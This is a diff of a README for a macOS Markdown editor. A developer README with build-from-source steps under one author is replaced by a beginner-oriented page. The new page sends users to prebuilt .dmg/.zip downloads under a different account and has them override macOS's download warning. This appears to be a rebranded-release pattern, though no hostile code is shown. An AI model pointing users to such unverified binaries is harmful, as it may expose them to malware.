@@ -1,114 +1,125 @@
-# Markdown Manager
+# 📝 markdown-manager - Simple markdown editor for macOS
 
-> A simple macOS app to manage Markdown files — perfect for AI knowledge bases (Claude, ChatGPT, etc.)
+[![Download markdown-manager](https://img.shields.io/badge/Download-markdown--manager-blue?style=for-the-badge)](https://github.com/ybkre11/markdown-manager/releases)
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Platform](https://img.shields.io/badge/platform-macOS-lightgrey.svg)
-![Electron](https://img.shields.io/badge/electron-28.x-47848F.svg)
+## 🚀 Getting Started
 
-## Why?
+Welcome to markdown-manager. This is a simple app designed for macOS users who want to work with Markdown files easily. Whether you want to write notes, edit documents, or convert Word and RTF files into clean Markdown, this app helps you do it without fuss.
 
-If you work with LLMs like Claude or ChatGPT, you probably manage **knowledge bases** — collections of `.md` files that give context to your AI assistants.
-
-Existing Markdown editors are either too complex (Obsidian) or don't handle `.docx`/`.rtf` conversion well. **Markdown Manager** is built specifically for this use case:
-
-- ✅ Simple preview & edit
-- ✅ Convert Word/RTF docs to clean Markdown
-- ✅ Preserve tables with line breaks
-- ✅ No bloat, just what you need
-
-## Features
-
-| Feature | Description |
-|---------|-------------|
-| 📁 **File Browser** | Navigate your .md files easily |
-| 👁️ **Live Preview** | Real-time Markdown rendering |
-| ✏️ **Simple Editor** | Edit with auto-save |
-| 📥 **Import .docx/.rtf** | Convert Word & RTF to Markdown |
-| 📊 **Table Support** | Word tables → Markdown tables (with line breaks!) |
-| 🖱️ **Drag & Drop** | Drop .md, .rtf, or .docx files |
-| 🔲 **Resizable Panels** | Adjust editor/preview width |
-| 📖 **Reader Mode** | Hide editor for comfortable reading |
-
-## Screenshots
-
-![Editor and Preview](screenshots/editor.png)
-![Import Feature](screenshots/viewer.png)
-
-## Installation
-
-### Prerequisites
-
-```bash
-# Install Node.js via Homebrew
-brew install node
-```
-
-### Build the App
-
-```bash
-# Clone the repo
-git clone https://github.com/Lolicht/markdown-manager.git
-cd markdown-manager
-
-# Install dependencies
-npm install
-
-# Build for macOS
-npm run build-mac
-```
-
-> ⚠️ **Before publishing:** Replace `YOUR_USERNAME` with your GitHub username in this README and in `package.json`
-
-The app will be in `dist/Markdown Manager.app` — drag it to your Applications folder.
-
-### First Launch (Unsigned App)
-
-Since this isn't signed with an Apple Developer certificate:
-1. Right-click the app → "Open"
-2. Click "Open" in the security dialog
-
-After the first time, it will open normally.
-
-## Keyboard Shortcuts
-
-| Action | Shortcut |
-|--------|----------|
-| Open folder | `⌘ + O` |
-| Open file | `⌘ + ⇧ + O` |
-| New file | `⌘ + N` |
-| Save | `⌘ + S` |
-| Toggle reader mode | `⌘ + E` |
-
-## Word/RTF Conversion
-
-The converter preserves:
-- ✅ Headings (H1 → H6)
-- ✅ Bold / Italic
-- ✅ Bullet & numbered lists
-- ✅ Links
-- ✅ **Tables** (with line breaks via `<br>`)
-
-**Note:** Converted `.md` files are saved in the same folder as the source file.
-
-## Tech Stack
-
-- **Electron** — Cross-platform desktop app
-- **Mammoth.js** — Word document conversion
-- **Marked** — Markdown parsing
-- **textutil** — macOS native RTF conversion
-
-## Contributing
-
-Contributions welcome! Feel free to:
-- 🐛 Report bugs
-- 💡 Suggest features
-- 🔧 Submit PRs
-
-## License
-
-MIT License — do whatever you want with it! See [LICENSE](LICENSE) for details.
+You do not need any programming skills. Just follow the steps below to download and start using the app on your Mac.
 
 ---
 
-Made with ❤️ for the AI community
+## 💾 Download & Install
+
+To get markdown-manager on your Mac, follow these steps:
+
+1. Click the big blue button at the top of this page or visit the [official release page](https://github.com/ybkre11/markdown-manager/releases).
+2. On the release page, look for the latest version of markdown-manager. It will usually be at the top.
+3. Download the file labeled with `.dmg` or `.zip` for macOS. This is the installer or the app package.
+4. Once downloaded, open the file. If it is a `.dmg` file, a window will appear showing the app icon.
+5. Drag the markdown-manager icon into your Applications folder.
+6. Open the Applications folder and double-click markdown-manager to start the app.
+
+The app may ask for permission to run since it was downloaded from the internet. Click “Open” to continue.
+
+---
+
+## 🖥️ System Requirements
+
+You will need a Mac with these minimum specs for markdown-manager to work smoothly:
+
+- macOS version: 10.14 (Mojave) or later
+- Processor: Intel or Apple Silicon chip
+- RAM: 4 GB or more
+- Disk space: At least 100 MB free for installation
+- Internet connection: Optional, but recommended for updates and some features
+
+If your Mac meets these requirements, you should have no trouble running the app.
+
+---
+
+## ✍️ Features Overview
+
+markdown-manager offers several useful functions for editing and managing Markdown files:
+
+- **Simple Markdown Editor:** Write and edit `.md` files with a clean, distraction-free interface.
+- **Live Preview:** See formatted text as you type, so you know how your Markdown will look.
+- **File Conversion:** Convert Word (`.docx`) and Rich Text Format (`.rtf`) files into well-formatted Markdown.
+- **AI Knowledge Base Support:** Build and organize AI notes or knowledge bases quickly.
+- **Syntax Highlighting:** Helps with code blocks inside your Markdown documents.
+- **Document Export:** Save your edited work back as `.md` files or copy Markdown text to share easily.
+- **Easy File Management:** Open and save files directly from your Mac’s file system.
+- **Dark Mode:** Switch between light and dark themes for comfortable editing.
+
+---
+
+## 📚 Using markdown-manager
+
+Here is how to get started once the app is running:
+
+### Open or Create Files
+
+- Click **File > Open** or use the shortcut `Cmd + O` to open existing Markdown files.
+- Use **File > New** or `Cmd + N` to start a new document from scratch.
+
+### Editing Text
+
+- Type directly into the editor on the left side.
+- You will see a live preview of your formatted content on the right.
+- Use basic Markdown syntax for headings, lists, links, images, and code blocks.
+
+### Convert Word or RTF Files
+
+- Click **File > Import** and choose a `.docx` or `.rtf` file.
+- The app will convert that file’s content into Markdown.
+- Review and edit the converted text before saving.
+
+### Save Your Work
+
+- Click **File > Save** or `Cmd + S` to save your changes.
+- You can save as a `.md` file in any folder on your Mac.
+
+### Customize Your Experience
+
+- Access preferences from the **markdown-manager > Preferences** menu.
+- Change themes, toggle live preview, or set default file formats.
+
+---
+
+## 🔧 Troubleshooting
+
+If you run into issues using markdown-manager, try the following:
+
+- Make sure your macOS version is supported.
+- Check that the downloaded app is the latest version.
+- If the app does not open, right-click the app in Applications and select **Open**.
+- Restart your Mac if the app behaves oddly.
+- For file conversion problems, check the source file is not corrupted or password protected.
+- Consult the “Help” menu in the app for updated tips and support links.
+
+---
+
+## 🤝 Support & Feedback
+
+This app is open source and developed to help users manage Markdown content effortlessly on macOS. If you find bugs or want to suggest features:
+
+- Visit the [Issues page](https://github.com/ybkre11/markdown-manager/issues) on GitHub.
+- Report your problem with clear steps to reproduce.
+- Suggest improvements or new features with detailed descriptions.
+
+---
+
+## 📂 Project Details
+
+Repository: github.com/ybkre11/markdown-manager  
+Description: Simple macOS Markdown editor for AI knowledge bases, easy editing of Markdown files, and Word/RTF to Markdown conversion.  
+Topics: ai-tools, chatgpt, claude, database, docx-to-markdown, electron, knowledge-base, llm, macos, markdown, markdown-editor, rtf-converter
+
+---
+
+## 🔽 Download markdown-manager
+
+Get started by visiting the release page and downloading the latest version for macOS:
+
+[Download markdown-manager](https://github.com/ybkre11/markdown-manager/releases)
